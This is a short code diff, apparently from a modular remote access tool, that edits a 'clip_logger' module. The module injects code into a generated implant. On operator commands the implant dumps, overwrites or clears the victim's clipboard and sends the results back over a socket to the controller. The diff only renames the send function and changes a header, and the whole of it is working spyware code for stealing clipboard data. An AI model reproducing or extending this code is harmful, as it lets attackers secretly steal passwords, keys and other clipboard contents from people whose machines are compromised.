@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -15,13 +14,13 @@ def clip_logger(option):
     flag = option.split(' ',1)
     if flag[0] == 'clip_dump':
         data = pyperclip.paste()
-        main_send('[+]Got clipboard data : \\n' + data, s)
+        send_all(s,'[+]Got clipboard data : \\n' + data)
     elif flag[0] == 'clip_set':
         pyperclip.copy(flag[1])
-        main_send('[+]Set clipboard text to : ' + flag[1], s)
+        send_all(s,'[+]Set clipboard text to : ' + flag[1])
     elif flag[0] == 'clip_clear':
         pyperclip.copy('')
-        main_send('[+]Cleared clipboard', s)''')
+        send_all(s,'[+]Cleared clipboard')''')
         config.logics.append('''
             elif command in ('clip_dump', 'clip_set', 'clip_clear'):
                 clip_logger(data)''')
